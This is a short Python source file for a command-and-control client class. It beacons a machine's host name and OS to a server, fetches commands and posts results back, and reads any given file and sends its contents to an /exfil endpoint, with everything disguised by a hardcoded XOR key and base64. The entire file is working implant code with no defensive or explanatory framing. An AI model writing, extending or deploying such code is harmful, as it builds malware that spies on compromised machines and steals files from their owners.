# -*- coding: utf-8 -*-
import base64
import requests
import time
import os

class C2:
    def __init__(self, server_url, secret_key="YOUSEF_SHTIWE"):
        self.server_url = server_url
        self.secret_key = secret_key

    def _xor_cipher(self, data):
        key = self.secret_key
        return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

    def encrypt(self, data):
        return base64.b64encode(self._xor_cipher(data).encode()).decode()

    def decrypt(self, encrypted_data):
        decoded = base64.b64decode(encrypted_data).decode()
        return self._xor_cipher(decoded)

    def beacon(self):
        metadata = f"ID:{os.uname().nodename}|OS:{os.uname().sysname}|TIME:{time.time()}"
        payload = self.encrypt(metadata)
        try:
            requests.post(f"{self.server_url}/beacon", data={"data": payload}, timeout=10)
            return True
        except:
            return False

    def exfiltrate(self, file_path):
        if not os.path.exists(file_path):
            return False
        with open(file_path, "rb") as f:
            data = base64.b64encode(f.read()).decode()
        payload = self.encrypt(data)
        try:
            requests.post(f"{self.server_url}/exfil", data={"filename": os.path.basename(file_path), "content": payload})
            return True
        except:
            return False

    def get_commands(self):
        try:
            r = requests.get(f"{self.server_url}/cmd", timeout=10)
            if r.status_code == 200:
                return self.decrypt(r.text)
        except:
            pass
        return None

    def send_results(self, result):
        payload = self.encrypt(result)
        try:
            requests.post(f"{self.server_url}/results", data={"data": payload})
        except:
            pass
